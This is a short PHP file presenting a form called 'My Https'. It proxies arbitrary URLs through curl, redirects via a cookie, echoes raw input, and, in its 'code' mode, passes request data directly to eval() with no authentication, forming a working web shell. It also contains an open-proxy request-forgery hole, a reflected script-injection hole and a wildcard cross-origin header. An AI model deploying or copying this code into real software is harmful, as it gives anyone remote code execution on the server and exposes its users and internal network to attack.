<?php
	$data = isset($_REQUEST["data"]) ? $_REQUEST["data"] : "";
	$type = isset($_REQUEST["type"]) ? $_REQUEST["type"] : "";
	$OK = isset($_REQUEST["submit"]) && $_REQUEST["submit"];
	if($OK && $data != "")
	{
		header('Access-Control-Allow-Origin: *');
		header('Access-Control-Allow-Methods: GET, POST');
	}
	if($OK && $type == "link")
	{
		$ch = curl_init($data);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$response = curl_exec($ch);
		$content_type = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
		curl_close($ch);
		header('Content-Type: '.$content_type);
		echo $response;
		//echo $content_type;
		//echo file_get_contents($data);
		exit();
	}
	if($OK && $type == "web")
	{
		$cookie_name = "host";
		$scheme = parse_url($data, PHP_URL_SCHEME);
		$host = parse_url($data, PHP_URL_HOST);
		$path = parse_url($data, PHP_URL_PATH);
		$time = 0;//time() + (86400 * 30);
		$scheme .= $scheme == '' ? 'http://' : '://';
		setcookie($cookie_name, $scheme.$host, $time, '/', null, true, true);
		//echo parse_url($data, PHP_URL_PATH);
		header('Location: '.$path);
		//echo '\n'.$_SERVER['HTTP_HOST'];
		//echo file_get_contents($data);
		exit();
	}
	if($OK && $type == "code")
	{
		eval($data);
		exit();
	}
	if($OK && $type == "text")
	{
		echo $data;
		exit();
	}
	if($type == "test")
	{
		echo "alert('Ok');";
		exit();
	}
	
	echo '
<html>
	<head>
		<title>My Https</title>
	</head>
	<body>
		<div class="View-content">
			<form id="form-request" name="form-request" action="'.$_SERVER['PHP_SELF'].'" method="post">
				<ul>
					<li>
						<select id="type" name="type" onchange="">
							<option selected="selected" value="link">Link:</option>
							<option value="web">Web</option>
							<option value="code">Code</option>
							<option value="text">Text</option>
						</select>
					</li>
					<li>
						<textarea id="data" name="data"></textarea>
					</li>
					<li>
						<input id="submit" name="submit" type="submit" value="OK"/>
					</li>
				</ul>
			</form>
		</div>
	</body>	
</html>
		';
?>
